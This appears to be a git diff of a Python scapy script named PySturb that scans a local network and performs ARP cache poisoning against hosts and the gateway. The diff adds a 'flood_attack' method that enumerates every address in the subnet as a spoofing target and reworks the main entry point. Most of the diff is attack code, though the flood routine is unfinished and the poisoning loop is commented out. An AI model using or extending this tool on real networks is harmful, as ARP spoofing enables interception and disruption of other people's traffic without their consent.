@@ -6,14 +6,32 @@ import netifaces
 import scapy.all as scapy
 import time
 import signal
+import inspect 
 
 # Print prettified json
 def jprint(args):
     print(json.dumps(args, indent=4, sort_keys=True))
 
+def serialize_object(obj):
+    instance_attributes = dict()
+    serialized = vars(obj)
+    for k in serialized:
+        attribute = dict()
+        if "<class '__main__" in str(type((serialized[k]))): 
+            ser = serialize_object(serialized[k])
+            print(ser)
+            attribute[k] = ser
+        else: attribute[k] = serialized[k]
+        instance_attributes[k] = attribute
+    return instance_attributes
+
+
 # Print pretiffied instance attributes
 def pprint(args):
-    jprint(vars(args))
+    jprint(serialize_object(args))
+
+def vprint(args):
+    print(vars(args))
 
 class Address:
     def __init__(self, ip, mac):
@@ -54,8 +72,8 @@ class PySturb:
             return
 
         # Assign addresses to global variable
-        ip = addrs[netifaces.AF_INET][0].get('addr')
-        mac = addrs[netifaces.AF_LINK][0].get('addr')
+        ip = scapy.get_if_addr(iface)
+        mac = scapy.get_if_hwaddr(iface)
         self.addr = Address(ip, mac)
 
         netmask = addrs[netifaces.AF_INET][0].get('netmask')
@@ -67,17 +85,28 @@ class PySturb:
         self.gateway = Address(gw_ip, gw_mac)
 
         # Scan targets
-        self.targets = self.scan_targets()
+#        self.targets = self.scan_targets()
 
     # Get available interfaces
     def get_iface_list(self):
         return [i for i in netifaces.interfaces() if i != 'lo']
 
+    # Attack all hosts in the network regardless if they're exist or not
     def flood_attack(self):
-        pass
+        total_host = 2**(32-self.cidr)-2
+        hosts = list()
+        for i in range(total_host):
+            if i == 0: continue
+            ip = self.gateway.ip.split('.')[:3]
+            ip.append(str(i+1))
+            ip = '.'.join(ip)
+            mac = ''
+            target = Address(ip, mac)
+            hosts.append(target)
+        pprint(self)
 
     def scan_targets(self):
-        print(' [*] Scanning network...  (Press CTRL+C to stop)\n')
+        print(' [*] Collecting targets...  (Press CTRL+C to begin arp forgery)\n')
         ips=self.addr.ip + '/' + str(self.cidr)
         ret = []
         global interrupt_loop
@@ -99,7 +128,7 @@ class PySturb:
                     mac = recv[scapy.ARP].hwsrc
                     if ip != self.gateway.ip and not any(x.ip == ip for x in ret):
                         ret.append(Address(ip, mac))
-                        print('     [{}] MAC: {}   IP: {}'.format(len(ret), mac, ip))
+                        print('\t[{}] MAC: {}\tIP: {}'.format(len(ret), mac, ip))
             time.sleep(0.5)
         return ret
 
@@ -134,14 +163,16 @@ class PySturb:
                 self.arp_spoof(target, self.gateway, verbose)
                 self.arp_spoof(self.gateway, target, verbose)
 
-worker = PySturb()
-worker.prompt_select_iface()
 
-try:
-    print('\n [*] Begin ARP cache poisoning...\n')
-    worker.begin_arp_cache_poisoning()
-except KeyboardInterrupt:
-    print('\n [*] Restoring network...\n')
-    worker.restore()
+if __name__ == '__main__':
+    worker = PySturb()
+    worker.prompt_select_iface()
+    worker.flood_attack()
 
-# pprint(worker)
+#try:
+ #   print('\n [*] Begin ARP cache poisoning...\n')
+  #  worker.begin_arp_cache_poisoning()
+#except KeyboardInterrupt:
+ #   print('\n [*] Restoring network...\n')
+  #  worker.restore()
+#pprint(worker)
